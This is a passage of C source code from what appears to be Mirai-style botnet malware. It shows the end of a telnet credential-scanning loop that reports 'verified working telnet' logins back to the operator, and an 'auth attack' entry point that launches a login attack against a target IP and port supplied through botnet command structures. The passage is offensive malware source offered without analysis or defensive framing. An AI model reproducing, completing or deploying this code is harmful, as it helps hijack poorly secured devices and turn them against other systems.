                            int tmp_len;
#ifdef DEBUG
                            printf("[auth attack] FD%d Found verified working telnet\n", conn->fd);
#endif
                            report_working(conn->dst_addr, conn->dst_port, conn->auth);
                            close(conn->fd);
                            conn->fd = -1;
                            conn->state = SC_CLOSED;
                        }
                        break;
                    default:
                        consumed = 0;
                        break;
                    }

                    // If no data was consumed, move on
                    if (consumed == 0)
                        break;
                    else
                    {
                        if (consumed > conn->rdbuf_pos)
                            consumed = conn->rdbuf_pos;

                        conn->rdbuf_pos -= consumed;
                        memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                    }
                }
            }
        }
    }
}

void attack_auth_auth(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    if (targs_len != 1 || opts_len != 1 || opts[0].key != 7)
        return;
    conn = calloc(1, sizeof(struct scanner_connection));
    target_ip = targs[0].addr;
    target_port = htons(atoi(opts[0].val));
#ifdef DEBUG
    printf("[auth attack] attack auth start.\n");
#endif
    attack_auth_auth_start();
}
